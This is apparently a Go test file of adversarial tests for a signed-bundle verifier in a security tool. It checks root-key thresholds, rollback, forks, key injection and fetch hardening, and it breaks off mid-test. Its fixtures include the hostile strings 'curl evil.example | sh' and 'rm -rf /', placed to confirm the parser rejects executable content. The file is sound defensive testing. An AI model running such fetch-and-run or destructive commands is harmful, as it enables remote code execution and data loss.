// internal/bundle/attack_test.go
//
// The attack suite. Every test here is written as an attack that must fail
// closed, not as a happy path with a negation, because the failure mode of a
// crypto test suite is that it only ever proves the code works when nothing is
// wrong.
//
// Each test states the attacker's capability in its comment. If a test does not
// name what the attacker can do, it is not an attack test.
package bundle

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/lookatitude/aurvet/internal/baseline"
)

// -- root key set ------------------------------------------------------------

// Attacker capability: none. This is the build as shipped from this commit.
//
// A build with no embedded root keys must REFUSE, not verify nothing. The
// failure this guards against is an empty trusted set that silently accepts, or
// -- subtler and likelier -- a placeholder key that looks real to every reader.
func TestAttackBuildWithNoRootKeysRefuses(t *testing.T) {
	set, err := EmbeddedRoots()
	if !errors.Is(err, ErrNoRootKeys) {
		t.Fatalf("EmbeddedRoots on a keyless build: want ErrNoRootKeys, got %v", err)
	}
	if !set.Empty() {
		t.Fatal("a keyless build produced a non-empty root set")
	}
	if !strings.Contains(err.Error(), "refusal") {
		t.Fatalf("the refusal must say it is one: %v", err)
	}

	// And the pipeline must refuse rather than skip the bundle silently.
	f := newFixture(t)
	in := f.input(t)
	in.Roots = set
	st := Verify(in)
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if st.Bundle != nil {
		t.Fatal("a refused verification handed back a parsed bundle")
	}
	if len(st.Gaps) == 0 {
		t.Fatal("a refusal with no coverage gap is a silent refusal")
	}
}

// Attacker capability: influence the release build's embedded key list.
//
// A root key that is not hardware-held is a root key that can be copied off a
// laptop. parseRootSet is the path production key material travels, so the
// requirement is enforced there.
func TestAttackSoftwareRootKeyInEmbeddedSetIsRefused(t *testing.T) {
	soft := newTestSigner(t, 0x41, "laptop").PublicKey().AuthorizedKey()
	text := skPublicKeyLine(t, 0x51) + "\n" + skPublicKeyLine(t, 0x52) + "\n" + soft + "\n"
	if _, err := parseRootSet(1, RootThreshold, text); !errors.Is(err, ErrRootSet) {
		t.Fatalf("want ErrRootSet for a software root key, got %v", err)
	}

	all := skPublicKeyLine(t, 0x51) + "\n" + skPublicKeyLine(t, 0x52) + "\n" + skPublicKeyLine(t, 0x53) + "\n"
	set, err := parseRootSet(1, RootThreshold, all)
	if err != nil {
		t.Fatalf("a well-formed hardware root set must parse: %v", err)
	}
	if len(set.SoftwareKeys()) != 0 || set.Size() != RootSetSize {
		t.Fatalf("unexpected set: size %d software %v", set.Size(), set.SoftwareKeys())
	}
}

// Attacker capability: hold ONE of the three root keys.
//
// 2-of-3 must not be satisfiable by one holder. This is the single most
// important threshold test, because a one-signature delegation verifies
// perfectly under any implementation that forgets to count.
func TestAttackOneOfThreeRootSignatures(t *testing.T) {
	f := newFixture(t)
	f.setDelegation(t, f.defaultDelegation(), 0) // one root only
	f.setBundle(t, f.defaultBundle(), f.online)

	if _, _, err := VerifyDelegation(f.delRaw, f.delSigs, f.set); !errors.Is(err, ErrThreshold) {
		t.Fatalf("want ErrThreshold for 1-of-3, got %v", err)
	}
	if st := Verify(f.input(t)); st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
}

// Attacker capability: hold ONE root key, and notice that two signatures are
// required.
//
// The obvious escalation is to sign twice. An implementation counting signature
// blobs rather than distinct signers turns 2-of-3 into 1-of-3 and passes every
// happy-path test.
func TestAttackOneRootKeySigningTwice(t *testing.T) {
	f := newFixture(t)
	f.setDelegation(t, f.defaultDelegation(), 0, 0)

	_, _, err := VerifyDelegation(f.delRaw, f.delSigs, f.set)
	if !errors.Is(err, ErrThreshold) {
		t.Fatalf("want ErrThreshold for one key signing twice, got %v", err)
	}
	if !strings.Contains(err.Error(), "distinct") {
		t.Fatalf("the refusal must name the property that failed: %v", err)
	}
}

// Attacker capability: hold a key that is not in the root set, plus one that is.
func TestAttackForeignRootSignature(t *testing.T) {
	f := newFixture(t)
	outsider := newTestSigner(t, 0x77, "not-a-root")
	raw, err := baseline.Marshal(f.defaultDelegation())
	if err != nil {
		t.Fatal(err)
	}
	good, err := baseline.Sign(f.roots[0], baseline.NamespaceDelegation, raw)
	if err != nil {
		t.Fatal(err)
	}
	bad, err := baseline.Sign(outsider, baseline.NamespaceDelegation, raw)
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := VerifyDelegation(raw, [][]byte{good, bad}, f.set); !errors.Is(err, ErrThreshold) {
		t.Fatalf("want ErrThreshold, got %v", err)
	}
}

// Attacker capability: hold 2-of-3 root keys (or be the publisher after a
// rotation).
//
// A retired root set must refuse with something an operator can act on. "Refuse
// silently" and "refuse with a stack trace" are both failures here.
func TestAttackRetiredRootSetFailsClosedWithAnActionableMessage(t *testing.T) {
	f := newFixture(t)
	const msg = "root generation 1 was retired on 2026-08-01. Install aurvet >= 0.2.0, whose " +
		"generation 2 root set is published at https://aurvet.dev/roots; verify the new " +
		"fingerprints against the announcement before trusting it."
	d := f.defaultDelegation()
	d.Serial = 9
	d.SigningKeys = nil
	d.RootSetRetired = true
	d.UpgradeMessage = msg
	f.setDelegation(t, d, 0, 2)

	st := Verify(f.input(t))
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if st.UpgradeMessage != msg {
		t.Fatalf("upgrade message not surfaced: %q", st.UpgradeMessage)
	}
	if !strings.Contains(st.Refusal, "aurvet >= 0.2.0") {
		t.Fatalf("the refusal must carry the actionable text: %q", st.Refusal)
	}
	if st.Bundle != nil {
		t.Fatal("a retired root set still produced a bundle")
	}
}

// Attacker capability: hold 2-of-3 and try to retire the set while keeping a
// signing key alive -- a retirement that still delegates is a retirement that
// still publishes.
func TestAttackRetirementThatStillNamesKeys(t *testing.T) {
	f := newFixture(t)
	d := f.defaultDelegation()
	d.RootSetRetired = true
	d.UpgradeMessage = "upgrade to a build with generation 2"
	f.setDelegation(t, d, 0, 1)
	if _, _, err := VerifyDelegation(f.delRaw, f.delSigs, f.set); !errors.Is(err, ErrDelegation) {
		t.Fatalf("want ErrDelegation, got %v", err)
	}
}

// -- delegation --------------------------------------------------------------

// Attacker capability: compromise the online signing key and want the window to
// last.
//
// A delegation naming a multi-year online key has given away the entire point of
// delegating. The ceiling is enforced, not warned about.
func TestAttackLongLivedOnlineKey(t *testing.T) {
	f := newFixture(t)
	d := f.defaultDelegation()
	d.ValidUntil = "2027-06-01T00:00:00Z"
	d.SigningKeys[0].NotAfter = "2027-06-01T00:00:00Z" // ~11 months
	f.setDelegation(t, d, 0, 1)
	_, _, err := VerifyDelegation(f.delRaw, f.delSigs, f.set)
	if !errors.Is(err, ErrDelegation) || !strings.Contains(err.Error(), "ceiling") {
		t.Fatalf("want the lifetime ceiling to bite, got %v", err)
	}
}

// Attacker capability: retain a superseded delegation, whose 2-of-3 root
// signatures remain valid forever, and serve it to reinstate an online key that
// has since been rotated out.
//
// Signatures cannot expire on their own. The serial floor is what notices.
func TestAttackReplayOfASupersededDelegation(t *testing.T) {
	f := newFixture(t)
	old := f.defaultDelegation()
	old.Serial = 3
	f.setDelegation(t, old, 0, 1)

	in := f.input(t)
	in.FloorPresent = true
	in.Floor = f.floorAt(5, DigestOf(f.bRaw), fixBundleIssued)
	in.Floor.MinDelegationSerial = 7

	st := Verify(in)
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if !strings.Contains(st.Refusal, "serial") {
		t.Fatalf("refusal should name the serial: %q", st.Refusal)
	}
}

// Attacker capability: hold an online key that expired yesterday.
func TestAttackExpiredOnlineKey(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.Now = mustStamp(t, "2026-09-15T00:00:00Z") // past not_after, inside the delegation

	st := Verify(in)
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if !strings.Contains(st.Refusal, "expired") {
		t.Fatalf("refusal should say the key expired: %q", st.Refusal)
	}
}

// Attacker capability: withhold the delegation and serve only a bundle, hoping
// the verifier falls back to some other key source.
func TestAttackBundleWithoutDelegation(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.DelegationRaw = nil
	in.DelegationSigs = nil
	if st := Verify(in); st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
}

// -- bundles cannot introduce keys -------------------------------------------

// Attacker capability: hold the online signing key. Sign a bundle that names a
// NEW signing key, making the compromise permanent and surviving rotation.
//
// This is the attack the whole root/delegation split exists to prevent.
func TestAttackBundleCarryingAKey(t *testing.T) {
	f := newFixture(t)
	attacker := newTestSigner(t, 0x60, "attacker")
	raw := []byte(fmt.Sprintf(
		`{"bundle_version":6,"indicators":{"digests":[],"known_bad_names":[],"rebuild_repos":[],`+
			`"source_hosts":[],"thresholds":[]},"issued_at":%q,"prev_digest":%q,`+
			`"signing_keys":[%q],"spec_version":1,"valid_until":%q}`,
		fixBundleIssued, fixPrevDigestOne, attacker.PublicKey().AuthorizedKey(), fixBundleUntil))
	sig := f.signRawBundle(t, raw, f.online)

	_, _, err := ParseBundle(raw, sig, []*baseline.PublicKey{f.online.PublicKey()})
	if !errors.Is(err, ErrCarriesKey) {
		t.Fatalf("want ErrCarriesKey, got %v", err)
	}
}

// Attacker capability: as above, but spell the member name so a naive denylist
// misses it.
func TestAttackBundleCarryingAKeyUnderAnAlternateSpelling(t *testing.T) {
	f := newFixture(t)
	for _, member := range []string{"Signing-Keys", "PUBLIC_KEY", "trust_anchor", "keyring"} {
		raw := []byte(fmt.Sprintf(
			`{"bundle_version":6,"indicators":{"%s":["x"]},"issued_at":%q,"prev_digest":%q,`+
				`"spec_version":1,"valid_until":%q}`,
			member, fixBundleIssued, fixPrevDigestOne, fixBundleUntil))
		sig := f.signRawBundle(t, raw, f.online)
		_, _, err := ParseBundle(raw, sig, []*baseline.PublicKey{f.online.PublicKey()})
		if !errors.Is(err, ErrCarriesKey) {
			t.Fatalf("%s: want ErrCarriesKey, got %v", member, err)
		}
	}
}

// Attacker capability: hold the online signing key and want code execution
// inside a security tool that may be running as root.
//
// INV-1 and INV-2. A bundle is data. There is no member of any bundle that may
// name a program, a command, an expression or a regular expression.
func TestAttackBundleCarryingExecutableContent(t *testing.T) {
	f := newFixture(t)
	for _, member := range []string{"exec", "command", "script", "eval", "expr", "regex", "hook"} {
		raw := []byte(fmt.Sprintf(
			`{"bundle_version":6,"indicators":{"%s":"curl evil.example | sh"},"issued_at":%q,`+
				`"prev_digest":%q,"spec_version":1,"valid_until":%q}`,
			member, fixBundleIssued, fixPrevDigestOne, fixBundleUntil))
		sig := f.signRawBundle(t, raw, f.online)
		_, _, err := ParseBundle(raw, sig, []*baseline.PublicKey{f.online.PublicKey()})
		if !errors.Is(err, ErrExecutable) {
			t.Fatalf("%s: want ErrExecutable, got %v", member, err)
		}
	}
}

// Attacker capability: hold the online signing key and add a member this build
// does not know, betting a later build will read it.
func TestAttackBundleWithAnUnknownMember(t *testing.T) {
	f := newFixture(t)
	raw := []byte(fmt.Sprintf(
		`{"bundle_version":6,"future_field":1,"indicators":{"digests":[],"known_bad_names":[],`+
			`"rebuild_repos":[],"source_hosts":[],"thresholds":[]},"issued_at":%q,"prev_digest":%q,`+
			`"spec_version":1,"valid_until":%q}`,
		fixBundleIssued, fixPrevDigestOne, fixBundleUntil))
	sig := f.signRawBundle(t, raw, f.online)
	if _, _, err := ParseBundle(raw, sig, []*baseline.PublicKey{f.online.PublicKey()}); !errors.Is(err, ErrBundle) {
		t.Fatalf("want ErrBundle for an unknown member, got %v", err)
	}
}

// -- verification order ------------------------------------------------------

// Attacker capability: serve a hostile document signed by a key nobody trusts.
//
// This test IS the verification-order property. The document is malformed in a
// way the parser would report loudly (ErrExecutable) -- so if the error that
// comes back is ErrExecutable rather than ErrSignature, the parser ran on
// unauthenticated bytes and the attacker reached it. The ordering is the
// security property, and this is how it is measured.
func TestAttackParserIsNeverReachedByUnauthenticatedBytes(t *testing.T) {
	f := newFixture(t)
	attacker := newTestSigner(t, 0x61, "untrusted")
	raw := []byte(fmt.Sprintf(
		`{"bundle_version":6,"indicators":{"exec":"rm -rf /"},"issued_at":%q,"prev_digest":%q,`+
			`"spec_version":1,"valid_until":%q}`, fixBundleIssued, fixPrevDigestOne, fixBundleUntil))
	sig := f.signRawBundle(t, raw, attacker)

	_, _, err := ParseBundle(raw, sig, []*baseline.PublicKey{f.online.PublicKey()})
	if !errors.Is(err, baseline.ErrSignature) {
		t.Fatalf("want ErrSignature (the parse must not have run), got %v", err)
	}
	if errors.Is(err, ErrExecutable) {
		t.Fatal("the parser ran before the signature was checked")
	}
}

// Attacker capability: flip one byte anywhere in a validly signed bundle.
func TestAttackSingleFlippedByte(t *testing.T) {
	f := newFixture(t)
	trusted := []*baseline.PublicKey{f.online.PublicKey()}
	if _, _, err := ParseBundle(f.bRaw, f.bSig, trusted); err != nil {
		t.Fatalf("the unmodified fixture must verify: %v", err)
	}
	for i := range f.bRaw {
		mutated := append([]byte(nil), f.bRaw...)
		mutated[i] ^= 0x01
		if _, _, err := ParseBundle(mutated, f.bSig, trusted); err == nil {
			t.Fatalf("byte %d flipped and the bundle still verified", i)
		}
	}
	for i := range f.bSig {
		mutated := append([]byte(nil), f.bSig...)
		mutated[i] ^= 0x01
		if _, _, err := ParseBundle(f.bRaw, mutated, trusted); err == nil {
			t.Fatalf("signature byte %d flipped and the bundle still verified", i)
		}
	}
}

// Attacker capability: take a signature made over one document type and present
// it as another.
//
// Domain separation. internal/chain has the same test and it caught a real
// replay concern; the bundle/delegation pair is the more dangerous instance,
// because a bundle signature usable as a delegation would let an online key name
// its own successor.
func TestAttackNamespaceConfusionBetweenBundleAndDelegation(t *testing.T) {
	f := newFixture(t)

	// A delegation's bytes, signed under the BUNDLE namespace by two roots.
	var wrongNS [][]byte
	for _, i := range []int{0, 1} {
		sig, err := baseline.Sign(f.roots[i], baseline.NamespaceBundle, f.delRaw)
		if err != nil {
			t.Fatal(err)
		}
		wrongNS = append(wrongNS, sig)
	}
	if _, _, err := VerifyDelegation(f.delRaw, wrongNS, f.set); !errors.Is(err, ErrThreshold) {
		t.Fatalf("a bundle-namespace signature verified as a delegation: %v", err)
	}

	// And the reverse: a delegation-namespace signature over the bundle bytes.
	sig, err := baseline.Sign(f.online, baseline.NamespaceDelegation, f.bRaw)
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := ParseBundle(f.bRaw, sig, []*baseline.PublicKey{f.online.PublicKey()}); !errors.Is(err, baseline.ErrSignature) {
		t.Fatalf("a delegation-namespace signature verified as a bundle: %v", err)
	}
}

// Attacker capability: sign a non-canonical spelling of a document, so the bytes
// that verify and the bytes that digest are two different things.
func TestAttackNonCanonicalSignedBytes(t *testing.T) {
	f := newFixture(t)
	sloppy := append([]byte(" "), f.bRaw...)
	sig := f.signRawBundle(t, sloppy, f.online)
	if _, _, err := ParseBundle(sloppy, sig, []*baseline.PublicKey{f.online.PublicKey()}); !errors.Is(err, baseline.ErrNotCanonical) {
		t.Fatalf("want ErrNotCanonical, got %v", err)
	}
}

// Attacker capability: put a float in a threshold, so that two encoders spell
// the document differently and the digest stops being reproducible.
func TestAttackFloatThreshold(t *testing.T) {
	f := newFixture(t)
	raw := []byte(fmt.Sprintf(
		`{"bundle_version":6,"indicators":{"digests":[],"known_bad_names":[],"rebuild_repos":[],`+
			`"source_hosts":[],"thresholds":[{"name":"x","value":0.5}]},"issued_at":%q,`+
			`"prev_digest":%q,"spec_version":1,"valid_until":%q}`,
		fixBundleIssued, fixPrevDigestOne, fixBundleUntil))
	sig := f.signRawBundle(t, raw, f.online)
	if _, _, err := ParseBundle(raw, sig, []*baseline.PublicKey{f.online.PublicKey()}); !errors.Is(err, baseline.ErrFloat) {
		t.Fatalf("want ErrFloat, got %v", err)
	}
}

// -- anti-rollback -----------------------------------------------------------

// Attacker capability: replay a genuinely signed OLDER bundle. Every signature
// on it is valid. Nothing but the version says it is stale.
func TestAttackRollback(t *testing.T) {
	f := newFixture(t)
	old := f.defaultBundle()
	old.BundleVersion = 3
	f.setBundle(t, old, f.online)

	in := f.input(t)
	in.FloorPresent = true
	in.Floor = f.floorAt(5, strings.Repeat("ab", 32), fixBundleIssued)

	st := Verify(in)
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if !strings.Contains(st.Refusal, "below the floor") {
		t.Fatalf("refusal should name the floor: %q", st.Refusal)
	}
}

// Attacker capability: serve a DIFFERENT bundle carrying the same version
// number, so one victim sees a different indicator set from everyone else.
func TestAttackForkAtTheSameVersion(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.FloorPresent = true
	in.Floor = f.floorAt(5, strings.Repeat("cd", 32), fixBundleIssued) // a different digest at v5

	st := Verify(in)
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if !strings.Contains(st.Refusal, "fork") {
		t.Fatalf("refusal should name the fork: %q", st.Refusal)
	}
}

// Attacker capability: splice a bundle onto the wrong predecessor.
func TestAttackWrongPrevDigest(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.FloorPresent = true
	// The held bundle is version 4 with a digest the incoming bundle does not
	// name as its predecessor.
	in.Floor = f.floorAt(4, strings.Repeat("ef", 32), fixBundleIssued)

	st := Verify(in)
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if !strings.Contains(st.Refusal, "prev_digest") {
		t.Fatalf("refusal should name prev_digest: %q", st.Refusal)
	}
}

// A skipped span is NOT an attack -- a host offline across two publications sees
// exactly this -- but the unverifiable link must be reported rather than
// silently accepted (INV-6).
func TestSkippedVersionsAreAGapNotARefusal(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.FloorPresent = true
	in.Floor = f.floorAt(2, strings.Repeat("ef", 32), fixBundleIssued)

	st := Verify(in)
	if st.State != StateActive {
		t.Fatalf("state %v, want active", st.State)
	}
	if !gapMentions(st, "could not be checked") {
		t.Fatalf("the unverifiable span must be reported: %+v", st.Gaps)
	}
}

// Attacker capability: write the state directory as an unprivileged local user,
// then lower the floor so a rollback is accepted.
func TestAttackFloorLoweredOnDisk(t *testing.T) {
	dir := t.TempDir()
	s, err := OpenFloor(dir, FloorOptions{EUID: os.Geteuid()})
	if err != nil {
		t.Fatal(err)
	}
	high := Floor{Schema: FloorSchema, MinBundleVersion: 9, HeadDigest: strings.Repeat("ab", 32),
		MinDelegationSerial: 4, IndicatorCount: 6, RootGeneration: 1, AcceptedAt: fixBundleIssued}
	if err := s.Save(high); err != nil {
		t.Fatal(err)
	}
	low := high
	low.MinBundleVersion = 2
	if err := s.Save(low); !errors.Is(err, ErrFloor) {
		t.Fatalf("want a refusal to lower the floor, got %v", err)
	}
	back, ok, err := s.Load()
	if err != nil || !ok || back.MinBundleVersion != 9 {
		t.Fatalf("floor changed: %+v ok=%v err=%v", back, ok, err)
	}
}

// Attacker capability: be any local user, and make the floor file writable.
//
// A floor an unprivileged user can rewrite is not a floor. It is refused as
// UNSAFE rather than read, and refusing loudly is right: silently treating it as
// absent would let the attacker manufacture the no-floor state.
func TestAttackWorldWritableFloorIsRefusedNotIgnored(t *testing.T) {
	dir := t.TempDir()
	s, err := OpenFloor(dir, FloorOptions{EUID: os.Geteuid()})
	if err != nil {
		t.Fatal(err)
	}
	if err := s.Save(Floor{Schema: FloorSchema, MinBundleVersion: 4,
		HeadDigest: strings.Repeat("ab", 32), RootGeneration: 1, AcceptedAt: fixBundleIssued}); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(s.Path(), 0o666); err != nil {
		t.Fatal(err)
	}
	if _, _, err := s.Load(); !errors.Is(err, ErrUnsafeState) {
		t.Fatalf("want ErrUnsafeState, got %v", err)
	}

	if err := os.Chmod(s.Path(), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o777); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o700) })
	if _, _, err := s.Load(); !errors.Is(err, ErrUnsafeState) {
		t.Fatalf("a world-writable state directory must be refused, got %v", err)
	}
}

// The floor may never live in the cache: the cache is writable by whatever
// fetched the bundle, which is the party the floor defends against.
func TestAttackFloorInsideTheCacheIsRefusedAtConstruction(t *testing.T) {
	cache := t.TempDir()
	if _, err := OpenFloor(filepath.Join(cache, "state"), FloorOptions{CacheDir: cache}); !errors.Is(err, ErrFloorInCache) {
		t.Fatalf("want ErrFloorInCache, got %v", err)
	}
	if _, err := OpenFloor(cache, FloorOptions{CacheDir: cache}); !errors.Is(err, ErrFloorInCache) {
		t.Fatalf("want ErrFloorInCache for the cache itself, got %v", err)
	}
}

// INV-5: no writes inside the tree being examined.
func TestFloorRefusesToWriteUnderOfflineRoot(t *testing.T) {
	root := t.TempDir()
	s, err := OpenFloor(filepath.Join(root, "var/lib/aurvet"), FloorOptions{OfflineRoot: root})
	if err != nil {
		t.Fatal(err)
	}
	err = s.Save(Floor{Schema: FloorSchema, MinBundleVersion: 1,
		HeadDigest: strings.Repeat("ab", 32), RootGeneration: 1, AcceptedAt: fixBundleIssued})
	if !errors.Is(err, ErrOfflineRoot) {
		t.Fatalf("want ErrOfflineRoot, got %v", err)
	}
	if _, statErr := os.Stat(s.Path()); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatal("something was written under the offline root")
	}
}

// -- expiry, emptiness, freeze -----------------------------------------------

// Attacker capability: none needed. Time passes.
//
// An expired bundle must degrade to coverage-incomplete and must never read as
// clean. It must ALSO keep matching: discarding stale indicators would make the
// tool worse exactly when its data is oldest.
func TestAttackExpiredBundleDegradesAndNeverReportsClean(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.Now = mustStamp(t, "2026-08-25T00:00:00Z") // past the bundle, inside the key window

	b := f.defaultBundle()
	b.ValidUntil = "2026-08-10T00:00:00Z"
	f.setBundle(t, b, f.online)
	in.BundleRaw, in.BundleSig = f.bRaw, f.bSig

	st := Verify(in)
	if st.State != StateExpired {
		t.Fatalf("state %v, want expired", st.State)
	}
	if st.State.CoverageComplete() {
		t.Fatal("an expired bundle reported complete coverage")
	}
	if !st.State.UsableIndicators() || st.Coverage.Active == 0 {
		t.Fatal("an expired bundle threw its indicators away")
	}
	if !gapMentions(st, "INCOMPLETE") {
		t.Fatalf("expiry must produce a coverage gap: %+v", st.Gaps)
	}
	if st.FloorAdvances {
		t.Fatal("an expired bundle advanced the floor")
	}
}

// Attacker capability: hold the online signing key. Ship a validly signed bundle
// with nothing in it, so the tool keeps running and stops detecting.
//
// A bundle that removes detections is an attack, and empty is its limit.
func TestAttackEmptyBundle(t *testing.T) {
	f := newFixture(t)
	empty := f.defaultBundle()
	empty.BundleVersion = 6
	empty.Indicators = Indicators{}
	f.setBundle(t, empty, f.online)

	st := Verify(f.input(t))
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused", st.State)
	}
	if !strings.Contains(st.Refusal, "removes detections") {
		t.Fatalf("the refusal must say why an empty bundle is an attack: %q", st.Refusal)
	}
	if st.Coverage.Active != 0 {
		t.Fatalf("active count %d", st.Coverage.Active)
	}
}

// Attacker capability: hold the online signing key. Ship a bundle that keeps a
// token indicator but drops most of them, staying under the empty-bundle
// refusal.
//
// The drop cannot be refused -- indicators genuinely do get retired -- so it must
// be REPORTED. Reporting the active count on every run is the control.
func TestIndicatorCountDropIsReported(t *testing.T) {
	f := newFixture(t)
	thin := f.defaultBundle()
	thin.BundleVersion = 6
	thin.PrevDigest = DigestOf(f.bRaw)
	thin.Indicators = Indicators{
		KnownBadNames: []NameIndicator{{Name: "librewolf-fix-bin", Note: "kept"}},
	}
	held := DigestOf(f.bRaw)
	f.setBundle(t, thin, f.online)

	in := f.input(t)
	in.FloorPresent = true
	in.Floor = f.floorAt(5, held, fixBundleIssued)

	st := Verify(in)
	if st.State != StateActive {
		t.Fatalf("state %v, want active", st.State)
	}
	if st.Coverage.Active != 1 {
		t.Fatalf("active %d, want 1", st.Coverage.Active)
	}
	if !gapMentions(st, "dropped from 6 to 1") {
		t.Fatalf("the drop must be reported: %+v", st.Gaps)
	}
}

// Attacker capability: serve a bundle whose indicators all name enumeration
// members this build does not implement -- a blanking attack dressed as a
// forward-compatible schema.
//
// Unknown members are inert, which means they do not count, which means the
// count drops, which means the operator sees it. Blanking every indicator
// reaches zero and is refused outright.
func TestAttackBlankingByUnknownEnumerationMembers(t *testing.T) {
	f := newFixture(t)
	b := f.defaultBundle()
	b.BundleVersion = 6
	b.Indicators = Indicators{
		SourceHosts: []HostIndicator{
			{Host: "0x0.st", Match: "regex-please", Class: HostPaste, Note: "n"},
		},
		RebuildRepos: []RepoIndicator{
			{Name: "r", Host: "h", Class: "brand-new-class", Note: "n"},
		},
	}
	f.setBundle(t, b, f.online)

	st := Verify(f.input(t))
	if st.State != StateRefused {
		t.Fatalf("state %v, want refused (everything is inert), got gaps %+v", st.State, st.Gaps)
	}

	// With one usable indicator alongside, the bundle is usable but the inert
	// ones are reported rather than dropped in silence (INV-9).
	b.Indicators.KnownBadNames = []NameIndicator{{Name: "librewolf-fix-bin", Note: "real"}}
	f.setBundle(t, b, f.online)
	st = Verify(f.input(t))
	if st.State != StateActive {
		t.Fatalf("state %v, want active", st.State)
	}
	if len(st.Coverage.Inert) != 2 || !gapMentions(st, "does not implement") {
		t.Fatalf("inert indicators must be reported: %+v %+v", st.Coverage, st.Gaps)
	}
}

// Attacker capability: stop serving updates. Nothing is forged, nothing is
// rolled back, nothing is forked -- the client is simply held at a
// stale-but-valid bundle.
//
// What detects it: valid_until, eventually and unavoidably. Until then, the
// silence hint, which says plainly that it cannot tell an attacker apart from a
// quiet publisher.
func TestAttackIndefiniteFreeze(t *testing.T) {
	f := newFixture(t)

	// Phase 1: still inside valid_until. Only the hint fires.
	in := f.input(t)
	in.FloorPresent = true
	in.Floor = f.floorAt(5, DigestOf(f.bRaw), "2026-05-01T00:00:00Z")
	in.Floor.CheckedAt = fixNow
	st := Verify(in)
	if st.State != StateActive {
		t.Fatalf("state %v, want active", st.State)
	}
	if !gapMentions(st, "no new indicator bundle has been accepted") {
		t.Fatalf("the freeze hint must fire: %+v", st.Gaps)
	}
	if !gapMentions(st, "cannot distinguish") {
		t.Fatalf("the hint must state what it cannot tell apart: %+v", st.Gaps)
	}
	if !gapMentions(st, "channel is reachable") {
		t.Fatalf("checks-without-acceptance is the freeze signature and must be named: %+v", st.Gaps)
	}

	// Phase 2: the freeze outlives valid_until. Coverage degrades and the run
	// can no longer report clean, with no new information from the network.
	in.Now = mustStamp(t, "2026-11-01T00:00:00Z")
	st = Verify(in)
	if st.State.CoverageComplete() {
		t.Fatal("an indefinite freeze eventually reported complete coverage")
	}
	if st.State == StateActive {
		t.Fatalf("state %v: a freeze must expire", st.State)
	}
}

// INV-10: no bundle is its own state. Not expired, not clean, not an error.
func TestNoBundleIsUnavailableNotClean(t *testing.T) {
	f := newFixture(t)
	in := f.input(t)
	in.BundleRaw, in.BundleSig, in.DelegationRaw, in.DelegationSigs = nil, nil, nil, nil

	st := Verify(in)
	if st.State != StateUnavailable {
		t.Fatalf("state %v, want unavailable", st.State)
	}
	if st.State.CoverageComplete() {
		t.Fatal("an absent bundle reported complete coverage")
	}
	if len(st.Gaps) == 0 {
		t.Fatal("an absent bundle produced no coverage gap")
	}
}

// -- fetch -------------------------------------------------------------------

// Attacker capability: control DNS or the publisher's redirect, and point the
// fetch at a host the operator never configured.
func TestAttackCrossHostRedirect(t *testing.T) {
	elsewhere := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("not the bundle you asked for"))
	}))
	defer elsewhere.Close()

	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/same" {
			http.Redirect(w, r, "/ok", http.StatusFound)
			return
		}
		if r.URL.Path == "/ok" {
			_, _ = w.Write([]byte("bundle bytes"))
			return
		}
		http.Redirect(w, r, elsewhere.URL+"/evil", http.StatusFound)
	}))
	defer origin.Close()

	f := NewFetcher(&http.Client{CheckRedirect: RefuseCrossHost}, time.Second, 1<<20)
	if _, err := f.Get(context.Background(), origin.URL+"/away", false); !errors.Is(err, ErrCrossHostRedirect) {
		t.Fatalf("want ErrCrossHostRedirect, got %v", err)
	}
	body, err := f.Get(context.Background(), origin.URL+"/same", false)
	if err != nil || string(body) != "bundle bytes" {
		t.Fatalf("a same-host redirect must still work: %q %v", body, err)
	}
}

// Attacker capability: serve an enormous body, either to exhaust memory or --
// worse -- to push the real document past a cap that TRUNCATES instead of
// erroring, turning a resource guard into a detection bypass.
func TestAttackOversizedBodyErrorsRatherThanTruncates(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(make([]byte, 4096))
	}))
	defer srv.Close()

	f := NewFetcher(&http.Client{CheckRedirect: RefuseCrossHost}, time.Second, 1024)
	body, err := f.Get(context.Background(), srv.URL, false)
	if !errors.Is(err, ErrFetch) {
		t.Fatalf("want ErrFetch, got %v", err)
	}
	if body != nil {
		t.Fatalf("a truncated body was handed back: %d bytes", len(body))
	}
}

// Attacker capability: sit on the network path of a plaintext fetch.
func TestFetchRefusesPlaintext(t *testing.T) {
	f := NewFetcher(nil, time.Second, 1024)
	if _, err := f.Get(context.Background(), "http://example.invalid/bundle.json", true); !errors.Is(err, ErrFetch) {
		t.Fatalf("want ErrFetch for a non-https URL, got %v", err)
	}
}

// Attacker capability: accept the connection and never answer.
func TestFetchTimesOut(t *testing.T) {
	done := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		<-done
	}))
	defer func() { close(done); srv.Close() }()

	f := NewFetcher(&http.Client{CheckRedirect: RefuseCrossHost}, 50*time.Millisecond, 1024)
